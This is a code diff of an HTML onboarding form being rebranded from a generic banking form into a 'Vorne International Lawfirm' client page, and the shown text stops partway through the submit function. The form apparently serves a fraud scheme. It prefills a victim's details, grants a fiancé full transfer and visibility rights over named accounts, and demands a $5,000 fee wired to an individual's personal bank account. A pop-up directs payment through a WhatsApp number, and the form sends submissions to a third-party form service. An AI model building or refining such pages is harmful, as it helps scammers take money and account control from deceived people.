@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Account Access & Beneficiary Onboarding</title>
+<title>Vorne International Lawfirm - Client Onboarding</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Georgia&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
@@ -14,10 +14,10 @@
 *{margin:0;padding:0;box-sizing:border-box;}
 
 body{
-font-family:Inter,sans-serif;
-background:#edf2f7;
+font-family:'Georgia', 'Times New Roman', serif;
+background:#F4F1EA;
 padding:20px 12px;
-color:#1f2937;
+color:#3A3C42;
 -webkit-text-size-adjust:100%;
 }
 
@@ -28,37 +28,47 @@ width:100%;
 }
 
 .card{
-background:#fff;
-border-radius:18px;
+background:#ffffff;
+border-radius:12px;
 overflow:hidden;
-box-shadow:0 15px 40px rgba(0,0,0,.12);
+box-shadow:0 6px 24px rgba(27,29,34,0.12);
+border: 1px solid #E5E0D5;
 }
 
 .header{
-background:linear-gradient(135deg,#0b4c7b,#082b49);
-color:white;
-padding:25px 20px;
+background:#1B1D22;
+color:#F4F1EA;
+padding:28px 24px;
 text-align:left;
+position:relative;
+border-bottom: 4px solid #C9A24B;
 }
 
 .header h1{
-font-size:22px;
-margin-bottom:8px;
+font-size:24px;
+margin-bottom:6px;
 line-height:1.3;
+color:#FFFFFF;
+letter-spacing:1px;
+text-transform:uppercase;
 }
 
 .header p{
-opacity:.95;
-font-size:13px;
-line-height:1.4;
+color:#C9A24B;
+font-size:12px;
+letter-spacing:1.5px;
+text-transform:uppercase;
+font-family: 'Inter', sans-serif;
+font-weight: 600;
 }
 
 .progress-container {
 padding:20px 15px;
-background:#f8fafc;
-border-bottom:1px solid #e2e8f0;
+background:#F4F1EA;
+border-bottom:1px solid #E5E0D5;
 overflow-x:auto;
 -webkit-overflow-scrolling:touch;
+font-family: 'Inter', sans-serif;
 }
 
 .steps-nav {
@@ -75,7 +85,7 @@ top:18px;
 left:0;
 right:0;
 height:3px;
-background:#cbd5e1;
+background:#E5E0D5;
 z-index:1;
 }
 
@@ -84,7 +94,7 @@ display:flex;
 flex-direction:column;
 align-items:center;
 gap:6px;
-background:#f8fafc;
+background:#F4F1EA;
 padding:0 8px;
 z-index:2;
 width:90px;
@@ -97,8 +107,8 @@ z-index:2;
 width:36px;
 height:36px;
 border-radius:50%;
-background:#cbd5e1;
-color:#475569;
+background:#E5E0D5;
+color:#7A7D85;
 display:flex;
 align-items:center;
 justify-content:center;
@@ -110,43 +120,47 @@ transition:all 0.3s ease;
 .step-label {
 font-size:11px;
 font-weight:600;
-color:#64748b;
+color:#7A7D85;
 line-height:1.2;
 }
 
 .step-item.active .step-circle {
-background:#0b4c7b;
-color:white;
-box-shadow:0 0 0 4px rgba(11,76,123,0.2);
+background:#1B1D22;
+color:#C9A24B;
+box-shadow:0 0 0 3px rgba(201,162,75,0.4);
+border: 1px solid #C9A24B;
 }
 
 .step-item.active .step-label {
-color:#0b4c7b;
+color:#1B1D22;
+font-weight:700;
 }
 
 .step-item.completed .step-circle {
-background:#16a34a;
-color:white;
+background:#C9A24B;
+color:#1B1D22;
 }
 
 .form-area{
 padding:25px 20px;
+font-family: 'Inter', sans-serif;
 }
 
 .notice{
-background:#eef6ff;
-border-left:4px solid #0b4c7b;
+background:#F4F1EA;
+border-left:4px solid #C9A24B;
 padding:14px 16px;
-border-radius:8px;
+border-radius:6px;
 margin-bottom:20px;
 font-size:13px;
 line-height:1.5;
+color:#3A3C42;
 }
 
 .notice-warning {
-background:#fffbe2;
-border-left-color:#d97706;
-color:#78350f;
+background:#FFFBE2;
+border-left-color:#C9A24B;
+color:#78350F;
 }
 
 .form-step {
@@ -168,11 +182,12 @@ margin-top:15px;
 }
 
 .section h2{
-color:#0b4c7b;
+color:#1B1D22;
 margin-bottom:15px;
 padding-bottom:6px;
-border-bottom:2px solid #e5e7eb;
-font-size:17px;
+border-bottom:2px solid #C9A24B;
+font-size:18px;
+font-family: 'Georgia', serif;
 }
 
 .grid{
@@ -184,8 +199,7 @@ gap:15px;
 @media(min-width:640px) {
   body{ padding:30px; }
   .header{ padding:35px; }
-  .header h1{ font-size:28px; }
-  .header p{ font-size:14px; }
+  .header h1{ font-size:26px; }
   .form-area{ padding:35px; }
   .steps-nav{ min-width:auto; }
   .grid{ grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:18px; }
@@ -202,22 +216,25 @@ label{
 font-weight:600;
 margin-bottom:6px;
 font-size:13px;
+color:#1B1D22;
 }
 
-input:not([type="checkbox"]), select, textarea {
+input:not([type="checkbox"]):not([type="radio"]), select, textarea {
 padding:12px;
-border:1px solid #cbd5e1;
-border-radius:8px;
+border:1px solid #E5E0D5;
+border-radius:6px;
 font-size:14px;
-font-family:inherit;
+font-family:'Inter', sans-serif;
 width:100%;
+background:#FFFFFF;
+color:#1B1D22;
 -webkit-appearance:none;
 }
 
 input:focus, select:focus, textarea:focus {
 outline:none;
-border-color:#0b4c7b;
-box-shadow:0 0 0 3px rgba(11,76,123,0.15);
+border-color:#C9A24B;
+box-shadow:0 0 0 3px rgba(201,162,75,0.25);
 }
 
 textarea{resize:vertical;}
@@ -228,13 +245,14 @@ flex-direction:column-reverse;
 gap:12px;
 margin-top:30px;
 padding-top:20px;
-border-top:1px solid #e2e8f0;
+border-top:1px solid #E5E0D5;
+font-family: 'Inter', sans-serif;
 }
 
 @media(min-width:480px) {
   .actions {
     flex-direction:row;
-    justify-content:space-between;
+    justify-space:between;
   }
 }
 
@@ -253,15 +271,18 @@ width:100%;
 }
 
 button{
-padding:12px 20px;
+padding:14px 24px;
 border:none;
-border-radius:10px;
-font-weight:600;
+border-radius:6px;
+font-weight:700;
 cursor:pointer;
-font-size:14px;
-transition:background 0.2s;
+font-size:13px;
+letter-spacing:0.75px;
+transition:all 0.2s;
 width:100%;
 text-align:center;
+text-transform:uppercase;
+font-family: 'Inter', sans-serif;
 }
 
 @media(min-width:480px) {
@@ -271,39 +292,42 @@ text-align:center;
 }
 
 .btn-next, .send{
-background:#0b4c7b;
-color:white;
+background:#C9A24B;
+color:#1B1D22;
 }
 
 .btn-next:hover, .send:hover{
-background:#08385b;
+background:#b08b3a;
 }
 
 .btn-prev {
-background:#e2e8f0;
-color:#334155;
+background:#E5E0D5;
+color:#1B1D22;
 }
 
 .btn-prev:hover {
-background:#cbd5e1;
+background:#d6cfc0;
 }
 
 .pdf{
-background:#16a34a;
-color:white;
+background:#1B1D22;
+color:#F4F1EA;
+border:1px solid #C9A24B;
 }
 
 .pdf:hover{
-background:#15803d;
+background:#2a2d35;
 }
 
 .footer{
-padding:18px 15px;
+padding:22px 20px;
 text-align:center;
-font-size:12px;
-color:#64748b;
-background:#f8fafc;
-line-height:1.4;
+font-size:11px;
+color:#7A7D85;
+background:#F4F1EA;
+line-height:1.6;
+border-top:1px solid #E5E0D5;
+letter-spacing:0.3px;
 }
 
 .checkbox-group{
@@ -321,9 +345,9 @@ gap:10px;
 font-size:13px;
 cursor:pointer;
 line-height:1.4;
+color:#3A3C42;
 }
 
-/* Explicit Checkbox Styling with Visible Tick Sign */
 .checkbox-group input[type="checkbox"] {
 appearance: auto !important;
 -webkit-appearance: checkbox !important;
@@ -332,10 +356,127 @@ height: 20px !important;
 margin-top: 2px;
 flex-shrink: 0;
 cursor: pointer;
-accent-color: #0b4c7b;
+accent-color: #C9A24B;
 }
 
-/* Modal / Pop-up Styling */
+/* Payment Type Selector Cards */
+.payment-type-grid {
+display: grid;
+grid-template-columns: 1fr;
+gap: 15px;
+margin-top: 15px;
+margin-bottom: 20px;
+}
+
+@media(min-width: 600px) {
+  .payment-type-grid {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+.payment-type-card {
+border: 2px solid #E5E0D5;
+border-radius: 8px;
+padding: 18px;
+cursor: pointer;
+transition: all 0.25s ease;
+background: #FFFFFF;
+position: relative;
+}
+
+.payment-type-card:hover {
+border-color: #C9A24B;
+background: #FAF8F5;
+}
+
+.payment-type-card.selected {
+border-color: #C9A24B;
+background: #F4F1EA;
+box-shadow: 0 4px 12px rgba(201, 162, 75, 0.15);
+}
+
+.payment-type-card input[type="radio"] {
+position: absolute;
+top: 18px;
+right: 18px;
+accent-color: #C9A24B;
+transform: scale(1.2);
+}
+
+.payment-card-title {
+font-size: 15px;
+font-weight: 700;
+color: #1B1D22;
+margin-bottom: 6px;
+font-family: 'Georgia', serif;
+}
+
+.payment-card-desc {
+font-size: 12px;
+color: #64748b;
+line-height: 1.4;
+}
+
+/* Dynamic Calculator Box Styling */
+.calc-container {
+background: #F4F1EA;
+border: 2px solid #C9A24B;
+border-radius: 8px;
+padding: 20px;
+margin-top: 20px;
+}
+
+.calc-title {
+font-size: 16px;
+font-weight: 700;
+color: #1B1D22;
+margin-bottom: 12px;
+display: flex;
+align-items: center;
+gap: 8px;
+font-family: 'Georgia', serif;
+}
+
+.calc-results {
+background: #ffffff;
+border: 1px dashed #C9A24B;
+border-radius: 6px;
+padding: 15px;
+margin-top: 15px;
+display: grid;
+grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+gap: 12px;
+}
+
+.calc-stat {
+display: flex;
+flex-direction: column;
+}
+
+.calc-stat-label {
+font-size: 11px;
+text-transform: uppercase;
+color: #7A7D85;
+font-weight: 700;
+margin-bottom: 2px;
+letter-spacing: 0.5px;
+}
+
+.calc-stat-value {
+font-size: 18px;
+font-weight: 800;
+color: #1B1D22;
+}
+
+.calc-stat-value.highlight {
+color: #C9A24B;
+}
+
+.calc-stat-value.green {
+color: #1B1D22;
+}
+
+/* Modal Styling */
 .modal-overlay {
 display:none;
 position:fixed;
@@ -343,22 +484,24 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(15, 23, 42, 0.65);
+background:rgba(27, 29, 34, 0.75);
 backdrop-filter:blur(4px);
 z-index:9999;
 justify-content:center;
 align-items:center;
 padding:20px;
+font-family: 'Inter', sans-serif;
 }
 
 .modal-content {
 background:#ffffff;
-border-radius:16px;
+border-radius:10px;
 max-width:550px;
 width:100%;
 padding:28px;
-box-shadow:0 25px 50px -12px rgba(0, 0, 0, 0.25);
+box-shadow:0 20px 40px rgba(0,0,0,0.3);
 position:relative;
+border: 1px solid #C9A24B;
 animation:modalSlide 0.3s cubic-bezier(0.16, 1, 0.3, 1);
 }
 
@@ -371,22 +514,23 @@ to { transform: translateY(0) scale(1); opacity: 1; }
 display:flex;
 align-items:center;
 justify-content:space-between;
-border-bottom:2px solid #f1f5f9;
+border-bottom:2px solid #C9A24B;
 padding-bottom:12px;
 margin-bottom:16px;
 }
 
 .modal-header h3 {
-color:#0b4c7b;
+color:#1B1D22;
 font-size:18px;
 font-weight:700;
+font-family: 'Georgia', serif;
 }
 
 .modal-close {
 background:none;
 border:none;
 font-size:22px;
-color:#64748b;
+color:#7A7D85;
 cursor:pointer;
 width:auto;
 padding:0 8px;
@@ -394,50 +538,51 @@ line-height:1;
 }
 
 .modal-close:hover {
-color:#0f172a;
+color:#1B1D22;
 }
 
 .modal-body {
 font-size:14px;
 line-height:1.6;
-color:#334155;
-background:#f8fafc;
+color:#3A3C42;
+background:#F4F1EA;
 padding:16px;
-border-radius:10px;
-border-left:4px solid #0b4c7b;
+border-radius:6px;
+border-left:4px solid #C9A24B;
 margin-bottom:20px;
 }
 
 .contact-box {
-background:#eef6ff;
-border:1px solid #bae6fd;
-border-radius:8px;
+background:#ffffff;
+border:1px solid #C9A24B;
+border-radius:6px;
 padding:12px;
 margin-top:12px;
 margin-bottom:12px;
 font-size:13px;
-color:#0369a1;
+color:#1B1D22;
 }
 
 .btn-modal-close {
-background:#0b4c7b;
-color:white;
+background:#C9A24B;
+color:#1B1D22;
 width:100%;
 padding:12px;
-border-radius:8px;
-font-weight:600;
+border-radius:6px;
+font-weight:700;
+letter-spacing: 0.5px;
 }
 
 .btn-modal-close:hover {
-background:#08385b;
+background:#b08b3a;
 }
 
 .btn-info-trigger {
-background:#e0f2fe;
-color:#0369a1;
-border:1px solid #bae6fd;
-padding:8px 14px;
-border-radius:8px;
+background:#F4F1EA;
+color:#1B1D22;
+border:1px solid #C9A24B;
+padding:10px 16px;
+border-radius:6px;
 font-size:13px;
 font-weight:600;
 cursor:pointer;
@@ -446,10 +591,11 @@ display:inline-flex;
 align-items:center;
 gap:6px;
 width:auto;
+text-transform: none;
 }
 
 .btn-info-trigger:hover {
-background:#bae6fd;
+background:#E5E0D5;
 }
 </style>
 </head>
@@ -460,8 +606,8 @@ background:#bae6fd;
 <div class="card">
 
 <div class="header">
-<h1>Banking Access & Designation Form</h1>
-<p>Multi-Stage Onboarding: Payable on Death (POD), Transfer Authority, Account Visibility & Payment</p>
+<h1>Vorne International Lawfirm</h1>
+<p>Confidential Client Onboarding & Financial Authority</p>
 </div>
 
 <!-- STAGE PROGRESS INDICATOR -->
@@ -481,7 +627,7 @@ background:#bae6fd;
         </div>
         <div class="step-item" id="step-nav-4">
             <div class="step-circle">4</div>
-            <div class="step-label">Payment Details</div>
+            <div class="step-label">Payment Options</div>
         </div>
         <div class="step-item" id="step-nav-5">
             <div class="step-circle">5</div>
@@ -492,7 +638,8 @@ background:#bae6fd;
 
 <div class="form-area" id="formContent">
 
-<form id="onboardingForm">
+<!-- FORMSPREE INTEGRATION -->
+<form id="onboardingForm" action="https://formspree.io/f/meaqwrdp" method="POST">
 
 <!-- STAGE 1: BENEFICIARY (POD) DESIGNATION -->
 <div class="form-step active-step" id="step-1">
@@ -552,7 +699,7 @@ background:#bae6fd;
             </div>
             <div class="field">
                 <label>Relationship</label>
-                <input type="text" name="relationship" value="Fiancé" readonly style="background:#f1f5f9;">
+                <input type="text" name="relationship" value="Fiancé" readonly style="background:#F4F1EA;">
             </div>
         </div>
     </div>
@@ -578,7 +725,7 @@ background:#bae6fd;
 <!-- STAGE 2: JOINT ACCOUNT & TRANSFER ACCESS -->
 <div class="form-step" id="step-2">
     <div class="notice notice-warning">
-        <strong>Stage 2 Notice (Transfer & Operating Access):</strong> Adding your fiancé as a Joint Account Holder or Authorized Signer grants her full legal access to withdraw, spend, and transfer funds from your personal checking/savings accounts while you are alive.
+        <strong>Stage 2 Notice (Transfer & Operating Access):</strong> Adding your fiancé as a Joint Account Holder or Authorized Signer grants her full legal access to withdraw, spend, and transfer funds from your designated checking/savings accounts while you are alive.
     </div>
 
     <div class="section">
@@ -598,11 +745,11 @@ background:#bae6fd;
         <div class="grid" style="margin-top:20px;">
             <div class="field">
                 <label>Target Checking Account Number for Transfers</label>
-                <input type="text" name="transferCheckingAcc" placeholder="e.g., XXXX-1234">
+                <input type="text" name="transferCheckingAcc" value="***2389" placeholder="e.g., ***2389">
             </div>
             <div class="field">
                 <label>Target Savings Account Number for Transfers</label>
-                <input type="text" name="transferSavingsAcc" placeholder="e.g., XXXX-5678">
+                <input type="text" name="transferSavingsAcc" value="***0930" placeholder="e.g., ***0930">
             </div>
         </div>
 
@@ -625,11 +772,11 @@ background:#bae6fd;
         <div class="checkbox-group">
             <label>
                 <input type="checkbox" name="viewChecking" value="Yes" checked="checked"> 
-                <span><strong>Checking Account Visibility</strong> (View balance, transaction history, statements).</span>
+                <span><strong>Checking Account Visibility (***2389)</strong> (View balance, transaction history, statements).</span>
             </label>
             <label>
                 <input type="checkbox" name="viewSavings" value="Yes" checked="checked"> 
-                <span><strong>Savings Account Visibility</strong> (View balance, interest earned, savings goals).</span>
+                <span><strong>Savings Account Visibility (***0930)</strong> (View balance, interest earned, savings goals).</span>
             </label>
             <label>
                 <input type="checkbox" name="viewMortgage" value="Yes" checked="checked"> 
@@ -654,10 +801,10 @@ background:#bae6fd;
     </div>
 </div>
 
-<!-- STAGE 4: PAYMENT DETAILS, INSTALLMENTS & PROOF OF PAYMENT -->
+<!-- STAGE 4: PAYMENT OPTIONS & SCHEDULE SELECTION -->
 <div class="form-step" id="step-4">
     <div class="notice">
-        <strong>Stage 4 Notice (Payment & Verification):</strong> Please enter payment details, select your preferred payment plan/installment frequency, and upload proof of payment for processing.
+        <strong>Stage 4 Notice (Payment Selection & Breakdown):</strong> Please choose whether you would like to make a full single payment today or proceed with an installment schedule.
     </div>
 
     <button type="button" class="btn-info-trigger" onclick="openPaymentModal()">
@@ -665,14 +812,14 @@ background:#bae6fd;
     </button>
 
     <div class="section">
-        <h2>Payment Details</h2>
+        <h2>1. Payment Fee & Strategy Selection</h2>
         <div class="grid">
             <div class="field">
-                <label>Payment Amount ($ USD)</label>
-                <input type="number" name="paymentAmount" value="5000" step="0.01">
+                <label>Total Legal & Transfer Processing Fee ($ USD)</label>
+                <input type="number" id="totalAmount" name="paymentAmount" value="5000" step="0.01" oninput="calculateInstallments()">
             </div>
             <div class="field">
-                <label>Payment Method</label>
+                <label>Preferred Payment Method</label>
                 <select name="paymentMethod">
                     <option selected>Bank Wire Transfer</option>
                     <option>Direct Deposit / ACH</option>
@@ -682,28 +829,77 @@ background:#bae6fd;
                     <option>Other</option>
                 </select>
             </div>
-            <div class="field">
-                <label>Payment Schedule / Plan</label>
-                <select name="paymentPlan" id="paymentPlanSelect" onchange="toggleInstallmentOptions()">
-                    <option value="Full Payment" selected>Full Lump Sum Payment</option>
-                    <option value="Installments">Installment Plan</option>
-                </select>
+        </div>
+
+        <!-- PAYMENT ARRANGEMENT SELECTOR -->
+        <label style="margin-top:20px; display:block;">Select Your Preferred Payment Arrangement:</label>
+        <div class="payment-type-grid">
+            <div class="payment-type-card selected" id="cardFull" onclick="selectPaymentType('full')">
+                <input type="radio" name="paymentChoice" id="radioFull" value="Full Payment" checked>
+                <div class="payment-card-title">Full Payment Today</div>
+                <div class="payment-card-desc">Pay the complete fee ($5,000.00) in full for expedited instant legal processing.</div>
             </div>
-            <div class="field" id="installmentField" style="display:none;">
-                <label>Installment Frequency & Terms</label>
-                <select name="installmentTerms">
-                    <option>2 Monthly Installments</option>
-                    <option>3 Monthly Installments</option>
-                    <option>4 Monthly Installments</option>
-                    <option>Bi-Weekly Payments</option>
-                    <option>Custom Plan (Specify in Notes)</option>
-                </select>
+            <div class="payment-type-card" id="cardInstallment" onclick="selectPaymentType('installment')">
+                <input type="radio" name="paymentChoice" id="radioInstallment" value="Installment Plan">
+                <div class="payment-card-title">Installment Plan</div>
+                <div class="payment-card-desc">Make a deposit today and schedule the remaining balance over upcoming terms.</div>
             </div>
         </div>
 
-        <div class="field" style="margin-top:15px; background:#f8fafc; padding:15px; border-radius:8px; border:1px solid #e2e8f0;">
-            <label style="color:#0b4c7b; font-weight:700; margin-bottom:8px;">SoFi Bank Wire Transfer Details</label>
-            <p style="font-size:13px; line-height:1.6; color:#334155;">
+        <!-- DYNAMIC INSTALLMENT SETTINGS (SHOWN WHEN INSTALLMENT SELECTED) -->
+        <div id="installmentFields" style="display:none;" class="calc-container">
+            <div class="calc-title">
+                ⚙️ Custom Installment Schedule
+            </div>
+            <div class="grid">
+                <div class="field">
+                    <label>Amount Ready to Pay Today (Initial Deposit)</label>
+                    <input type="number" id="initialDeposit" name="initialDeposit" value="2000" step="0.01" oninput="calculateInstallments()">
+                </div>
+                <div class="field">
+                    <label>Installment Schedule Duration</label>
+                    <select id="installmentFrequency" name="installmentTerms" onchange="calculateInstallments()">
+                        <option value="2" selected>2 Installments (Initial + 1 Remainder)</option>
+                        <option value="3">3 Installments (Initial + 2 Remainders)</option>
+                        <option value="4">4 Installments (Initial + 3 Remainders)</option>
+                        <option value="6">6 Monthly Payments</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- DYNAMIC BREAKDOWN DISPLAY -->
+        <div class="calc-container">
+            <div class="calc-title">
+                🧮 Payment Summary Breakdown
+            </div>
+            <div class="calc-results">
+                <div class="calc-stat">
+                    <span class="calc-stat-label">Total Amount</span>
+                    <span class="calc-stat-value" id="resTotal">$5,000.00</span>
+                </div>
+                <div class="calc-stat">
+                    <span class="calc-stat-label">Paying Today</span>
+                    <span class="calc-stat-value green" id="resPaid">$5,000.00</span>
+                </div>
+                <div class="calc-stat">
+                    <span class="calc-stat-label">Remaining Balance</span>
+                    <span class="calc-stat-value highlight" id="resBalance">$0.00</span>
+                </div>
+                <div class="calc-stat">
+                    <span class="calc-stat-label">Per Subsequent Payment</span>
+                    <span class="calc-stat-value" id="resPerInstallment">Paid in Full</span>
+                </div>
+            </div>
+
+            <!-- hidden inputs for Formspree submit payload -->
+            <input type="hidden" id="calcRemainingBalance" name="calculatedRemainingBalance" value="0.00">
+            <input type="hidden" id="calcInstallmentAmount" name="calculatedInstallmentAmount" value="0.00">
+        </div>
+
+        <div class="field" style="margin-top:20px; background:#F4F1EA; padding:15px; border-radius:6px; border:1px solid #C9A24B;">
+            <label style="color:#1B1D22; font-weight:700; margin-bottom:8px; font-family:'Georgia', serif;">SoFi Bank Wire Transfer Details</label>
+            <p style="font-size:13px; line-height:1.6; color:#3A3C42;">
                 <strong>Bank Name:</strong> SoFi Bank<br>
                 <strong>Account Name:</strong> Angela Winslow<br>
                 <strong>Routing Number:</strong> 031101334<br>
@@ -713,21 +909,12 @@ background:#bae6fd;
             </p>
         </div>
     </div>
-
-    <div class="section">
-        <h2>Upload Proof of Payment</h2>
-        <div class="field">
-            <label>Attach Payment Receipt / Wire Confirmation / Transfer Screenshot</label>
-            <input type="file" name="paymentProof" id="paymentProofInput" accept="image/*,.pdf">
-            <p style="font-size:12px; color:#64748b; margin-top:5px;">Accepted formats: PNG, JPG, JPEG, PDF</p>
-        </div>
-    </div>
 </div>
 
 <!-- STAGE 5: REVIEW & SUBMISSION -->
 <div class="form-step" id="step-5">
     <div class="notice">
-        <strong>Stage 5 Review:</strong> Please confirm all information prior to submitting or generating the final document for bank processing.
+        <strong>Stage 5 Review:</strong> Please confirm all information prior to submitting or generating the final document for processing.
     </div>
 
     <div class="section">
@@ -739,7 +926,7 @@ background:#bae6fd;
             </label>
             <label>
                 <input type="checkbox" name="ackTransfer" required checked="checked"> 
-                <span>I understand granting transfer access gives immediate withdrawal rights on specified accounts.</span>
+                <span>I understand granting transfer access gives immediate withdrawal rights on specified accounts (***2389 / ***0930).</span>
             </label>
             <label>
                 <input type="checkbox" name="ackVisibility" required checked="checked"> 
@@ -747,13 +934,13 @@ background:#bae6fd;
             </label>
             <label>
                 <input type="checkbox" name="ackPayment" required checked="checked"> 
-                <span>I confirm that the payment details and uploaded proof of payment are accurate.</span>
+                <span>I confirm that the selected payment schedule details are accurate.</span>
             </label>
         </div>
 
         <div class="field" style="margin-top:20px;">
-            <label>Additional Notes / Bank Representative Instructions</label>
-            <textarea rows="4" name="notes" placeholder="Enter any extra details or instructions for your bank officer..."></textarea>
+            <label>Additional Notes / Legal Representative Instructions</label>
+            <textarea rows="4" name="notes" placeholder="Enter any extra details or instructions for your legal representative..."></textarea>
         </div>
     </div>
 </div>
@@ -773,7 +960,7 @@ background:#bae6fd;
 </div>
 
 <div class="footer">
-Professional Banking Information Collection Form • Multi-Stage Account & Beneficiary Onboarding
+&copy; Vorne International Lawfirm. All Rights Reserved.<br>This document contains confidential and privileged information intended only for legal administration.
 </div>
 
 </div>
@@ -790,15 +977,15 @@ Professional Banking Information Collection Form • Multi-Stage Account & Benef
         <div class="modal-body">
             The payment is meant to cover:
             <ul style="margin-left: 20px; margin-top: 8px; margin-bottom: 12px; display: flex; flex-direction: column; gap: 6px;">
-                <li>My legal work</li>
+                <li>Legal work & filing</li>
                 <li>Logistics to the bank</li>
                 <li>Adding your name to the house as a legal partner</li>
-                <li>Transfers execution</li>
+                <li>Transfers execution on accounts ***2389 & ***0930</li>
             </ul>
             <p><strong>Important Instruction:</strong> All payments should be completed and sent directly to the lawyer's email or WhatsApp.</p>
             
             <div class="contact-box">
-                <strong>📞 Contact Lawyer:</strong> You can call or WhatsApp the lawyer directly at <strong>+1 785 408 3160</strong>.
+                <strong>📞 Contact Vorne Lawfirm Representative:</strong> Call or WhatsApp directly at <strong>+1 785 408 3160</strong>.
             </div>
 
             <p style="margin-top: 8px;">Immediately all payments are completed and sent to the lawyer's email or WhatsApp, processes will continue. All legal documentation you need will be sent to you as your proof, along with full access to the account mobile banking (savings, checking, and kids accounts).</p>
@@ -808,10 +995,9 @@ Professional Banking Information Collection Form • Multi-Stage Account & Benef
 </div>
 
 <script>
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwt9UBfQCIbi55hzPQmiaid-O9wASVgVgXCPZbNXQTRxPnzehHbbxiSJAu6FtJWILtOcg/exec";
-
 let currentStep = 1;
 const totalSteps = 5;
+let paymentType = 'full'; // 'full' or 'installment'
 
 document.addEventListener("DOMContentLoaded", function () {
 
@@ -822,46 +1008,87 @@ document.addEventListener("DOMContentLoaded", function () {
         checkbox.setAttribute('checked', 'checked');
     });
 
-    // Account holder
+    // Default account details
     const holderName = document.querySelector('[name="holderName"]');
     if (holderName) holderName.value = "Derrick Remon Parrot";
 
-    // Existing account
     const accountNumber = document.querySelector('[name="accountNumber"]');
     if (accountNumber) accountNumber.value = "****9034";
 
-    // Government ID
     const idNumber = document.querySelector('[name="idNumber"]');
     if (idNumber) idNumber.value = "****88643";
 
-    // Relationship
     const relationship = document.querySelector('[name="relationship"]');
     if (relationship) relationship.value = "Fiancé";
 
-    // POD allocation
     const percentage = document.querySelector('[name="percentage"]');
     if (percentage) percentage.value = "100%";
 
-    // STAGE 4 — PAYMENT
-    const paymentAmount = document.querySelector('[name="paymentAmount"]');
-    if (paymentAmount) paymentAmount.value = "5000";
-
-    const paymentMethod = document.querySelector('[name="paymentMethod"]');
-    if (paymentMethod) {
-        const wireOption = Array.from(paymentMethod.options).find(option =>
-            option.textContent.toLowerCase().includes("wire")
-        );
-        if (wireOption) {
-            paymentMethod.value = wireOption.value;
-        }
-    }
-
-    const paymentPlan = document.querySelector('[name="paymentPlan"]');
-    if (paymentPlan) {
-        paymentPlan.value = "Full Payment";
-        toggleInstallmentOptions();
-    }
+    calculateInstallments();
 });
+
+function selectPaymentType(type) {
+    paymentType = type;
+    
+    const cardFull = document.getElementById("cardFull");
+    const cardInstallment = document.getElementById("cardInstallment");
+    const radioFull = document.getElementById("radioFull");
+    const radioInstallment = document.getElementById("radioInstallment");
+    const installmentFields = document.getElementById("installmentFields");
+
+    if (type === 'full') {
+        cardFull.classList.add("selected");
+        cardInstallment.classList.remove("selected");
+        radioFull.checked = true;
+        installmentFields.style.display = "none";
+    } else {
+        cardInstallment.classList.add("selected");
+        cardFull.classList.remove("selected");
+        radioInstallment.checked = true;
+        installmentFields.style.display = "block";
+    }
+
+    calculateInstallments();
+}
+
+function calculateInstallments() {
+    const totalEl = document.getElementById("totalAmount");
+    const depositEl = document.getElementById("initialDeposit");
+    const freqEl = document.getElementById("installmentFrequency");
+
+    let total = parseFloat(totalEl.value) || 0;
+    let deposit = total;
+    let parts = 1;
+
+    if (paymentType === 'installment') {
+        deposit = parseFloat(depositEl.value) || 0;
+        parts = parseInt(freqEl.value) || 2;
+        if (deposit > total) deposit = total;
+    }
+
+    let remainingBalance = Math.max(0, total - deposit);
+    let remainingInstallmentsCount = parts - 1;
+    let perInstallment = 0;
+
+    if (remainingInstallmentsCount > 0 && remainingBalance > 0) {
+        perInstallment = remainingBalance / remainingInstallmentsCount;
+    }
+
+    const fmt = (num) => "$" + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+    document.getElementById("resTotal").innerText = fmt(total);
+    document.getElementById("resPaid").innerText = fmt(deposit);
+    document.getElementById("resBalance").innerText = fmt(remainingBalance);
+
+    if (paymentType === 'full' || remainingInstallmentsCount === 0 || remainingBalance === 0) {
+        document.getElementById("resPerInstallment").innerText = "Paid in Full";
+    } else {
+        document.getElementById("resPerInstallment").innerText = `${fmt(perInstallment)} × ${remainingInstallmentsCount}`;
+    }
+
+    document.getElementById("calcRemainingBalance").value = remainingBalance.toFixed(2);
+    document.getElementById("calcInstallmentAmount").value = perInstallment.toFixed(2);
+}
 
 function openPaymentModal() {
     document.getElementById("paymentModal").style.display = "flex";
@@ -869,16 +1096,6 @@ function openPaymentModal() {
 
 function closePaymentModal() {
     document.getElementById("paymentModal").style.display = "none";
-}
-
-function toggleInstallmentOptions() {
-    const plan = document.getElementById("paymentPlanSelect").value;
-    const installmentField = document.getElementById("installmentField");
-    if (plan === "Installments") {
-        installmentField.style.display = "flex";
-    } else {
-        installmentField.style.display = "none";
-    }
 }
 
 function changeStep(direction) {
@@ -909,9 +1126,9 @@ function changeStep(direction) {
     document.getElementById(`step-${currentStep}`).classList.add('active-step');
     document.getElementById(`step-nav-${currentStep}`).classList.add('active');
 
-    // Trigger Pop-up when reaching Stage 4 (Payment Stage)
     if (currentStep === 4) {
         openPaymentModal();
+        calculateInstallments();
     }
 
     const activeNavStep = document.getElementById(`step-nav-${currentStep}`);
@@ -944,54 +1161,38 @@ async function sendForm() {
 
     const sendBtn = document.getElementById("sendBtn");
     sendBtn.disabled = true;
-    sendBtn.innerText = "Submitting...";
+    sendBtn.innerText = "SUBMITTING...";
 
     const formData = new FormData(form);
-    const payload = {};
-
-    formData.forEach((value, key) => {
-        if (!(value instanceof File)) {
-            payload[key] = value;
-        }
-    });
-
-    const fileInput = document.getElementById("paymentProofInput");
-    if (fileInput && fileInput.files.length > 0) {
-        const file = fileInput.files[0];
-        const base64 = await convertFileToBase64(file);
-        payload.fileData = base64;
